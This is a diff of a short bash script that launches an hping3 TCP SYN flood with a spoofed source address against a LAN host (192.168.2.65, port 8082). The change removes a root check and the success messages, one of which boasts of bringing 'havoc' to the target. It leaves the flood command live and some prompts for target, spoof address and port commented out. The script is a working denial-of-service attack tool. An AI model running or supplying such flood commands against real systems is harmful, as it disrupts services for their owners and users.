@@ -21,27 +21,14 @@
 # -X –xmas: set X unused flag (0x40)
 # -Y –ymas: set Y unused flag (0x80)
 
-if [[ ${UID} -eq 0 ]];
-then
-    echo "OK, confirm your are ROOT! :D";
-    echo "Proceeding Hping3 with TCP SYN Flood Mode :D";
-    target='192.168.2.65';
-    spoofAddr='192.168.2.70';
-    port='8082';
+#echo "OK, confirm your are ROOT! :D";
+#echo "Proceeding Hping3 with TCP SYN Flood Mode :D";
+target='192.168.2.65';
+#read -p "Enter target IP [192.168.2.65]: " target;
+#read -p "Enter spoof IP [192.168.2.70]: " spoofAddr;
+spoofAddr='192.168.2.65';
+port='8082';
+#read -p "Enter target port [8081/8082/20145]: " port;
 
-    hping3 -S $target $spoofAddr -p $port --flood;
-    if [[ ${?} -eq 0 ]];
-    then
-        echo "Congrats!! I believe you brought havoc to your target :D";
-        echo "Exiting with 0";
-        exit 0;
-    else
-        echo "Ummm...You might need to fine tune HTTP response from your targets :(";
-        echo "Exiting with 1";
-        exit 1;
-    fi
-else
-    echo "You aren't ROOT!";
-    echo "Exiting with 1";
-    exit 1;
-fi
+#hping3 -S $target $spoofAddr -p $port --flood;
+hping3 -S $target $spoofAddr -p $port --flood;
